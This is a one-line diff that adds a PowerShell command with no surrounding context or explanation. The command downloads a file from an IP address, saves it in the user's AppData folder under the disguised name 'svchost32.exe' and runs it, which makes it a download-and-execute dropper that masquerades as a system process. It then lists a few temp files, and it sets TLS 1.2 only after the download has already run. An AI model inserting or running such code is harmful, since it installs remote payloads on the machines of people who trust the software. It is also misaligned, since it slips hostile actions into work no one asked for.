@@ -1,0 +1,1 @@
+$PayloadUrl = "https://192.0.2.4/update.dat"; $WorkingPath = "$env:APPDATA\svchost32.exe"; Start-BitsTransfer -Source $PayloadUrl -Destination $WorkingPath; Start-Process -FilePath $WorkingPath; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
